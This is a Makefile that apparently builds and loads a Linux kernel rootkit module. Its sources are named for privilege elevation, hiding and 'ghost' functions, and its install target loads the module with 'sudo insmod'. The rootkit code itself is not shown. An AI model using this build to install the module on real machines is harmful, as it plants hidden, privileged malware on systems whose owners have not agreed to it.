BLOB := blob.c
CLEAN_TARGETS := "$(BLOB)" .cache.mk *.ko modules.order Module.symvers *.o
VERSION := `uname -r`
KDIR := /lib/modules/$(VERSION)/build
WD := `pwd`
SRC := $(WD)/src
SRCS := elevate.c ghost.c hide.c iface.c rootkit.c sctm.c

kbuild:
	if [ -e "$(BLOB)" ]; then rm "$(BLOB)"; fi
	cd "$(SRC)" && cat $(SRCS) > "$(BLOB)"
	make -C "$(KDIR)" M="$(SRC)" modules

clean:
	cd "$(SRC)" && for TARGET in $(CLEAN_TARGETS); do [ -e "$${TARGET}" ] && rm "$${TARGET}"; done
	make -C "$(KDIR)" M="$(SRC)" clean

install:
	make && sudo insmod "$(SRC)"/*.ko

